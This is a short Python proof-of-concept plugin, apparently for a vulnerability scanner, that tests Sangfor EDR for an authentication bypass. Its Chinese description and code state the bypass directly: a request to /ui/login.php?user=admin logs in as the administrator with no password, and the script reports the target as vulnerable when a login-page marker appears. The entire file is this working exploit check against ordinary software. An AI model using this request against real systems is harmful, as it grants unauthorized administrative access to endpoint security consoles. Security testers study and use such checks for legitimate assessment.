#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse

def vuln_info():
    info={
        'name': '深信服EDR任意用户登录',
        'referer':'https://zhuanlan.zhihu.com/p/190988175',
        'author':'qianxiao996',
        'description':'''访问/ui/login.php?user=admin即可登陆系统'''

    }
    return info
def run(MainWindows,url,all):
    # all =  0=url  1=filename  2=pocmethods  3=pocname
    bug = '/ui/login.php?user=admin'
    url = url + bug
    try:
        r = requests.get(url,timeout=5)
        if 'EDR已守护全网终端' in r.text:
            MainWindows.vuln_scanner_log('result', '存在',url,all)
        else:
            MainWindows.vuln_scanner_log('result', '不存在',url,all)
    except:
        MainWindows.vuln_scanner_log('result', '不存在',url,all)
    

